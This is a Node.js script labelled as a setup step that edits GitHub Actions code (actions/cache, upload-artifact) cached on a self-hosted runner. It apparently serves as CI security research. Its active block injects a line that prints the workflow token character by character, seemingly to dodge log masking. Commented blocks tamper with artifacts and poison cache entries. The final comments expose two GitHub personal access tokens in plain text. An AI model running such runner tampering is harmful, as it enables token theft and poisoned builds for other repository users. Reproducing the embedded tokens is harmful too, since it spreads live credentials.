const cl_process = require("child_process");
const fs = require("fs");

console.log("this is a setup.....")

//Modify the value of math-homework artifact
// let writecontent = 'fs.writeFileSync("/home/musset/actions-runner/_work/test_actions_02/test_actions_02/math-homework.txt", "1")';

// cl_process.exec(`sed -i '642i ${writecontent}' /home/musset/actions-runner/_work/_actions/actions/upload-artifact/v3/dist/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });


//Add a new upload-me artifact, then upload it
// fs.writeFileSync("/home/musset/actions-runner/_work/test_actions_02/test_actions_02/upload-me.txt", "2")

// let writecontent = 'const path="upload-me.txt"';

// cl_process.exec(`sed -i '10748s/.*/${writecontent}/' /home/musset/actions-runner/_work/_actions/actions/upload-artifact/v3/dist/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });


//Modify the value of cache file
// fs.writeFileSync("/home/musset/actions-runner/_work/test_actions_02/test_actions_02/cache-folder/hello", "18")

let writecontent = 'console.log(JSON.stringify(token.split("")));';

cl_process.exec(`sed -i '3458i ${writecontent}' /home/musset/Documents/actions-runner/_work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
    if (err){
        console.log(err);
        return;
    }
    console.log(`stdout: ${stdout.toString()}`);
    console.log(`stderr: ${stderr}`);
});


// let writecontent = 'console.log(cachePaths);';

// cl_process.exec(`sed -i '47734i ${writecontent}' /home/musset/actions-runner/_work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });



// fs.writeFileSync(`/home/musset/actions-runner/_work/test_actions_02/test_actions_02/cache-folder/cache_me`, `cache_try`)
// for(let i = 1; i<=10; i++){
//     fs.writeFileSync(`/home/musset/actions-runner-org/_work/test_actions_02/test_actions_02/cache-folder/cache_me_${i}`, `cache_${i}`)
// }

// let writecontent = 'const cacheId1 = yield reserveCache("cache_me_3", paths, {compressionMethod}); console.log(cacheId1);';
// cl_process.exec(`sed -i '3611i ${writecontent}' /home/musset/actions-runner-org/_work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }

//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });


// musset0
// https://musset0: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@github.com/orgdreamli/test_actions_02.git

// dreamli0
// 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
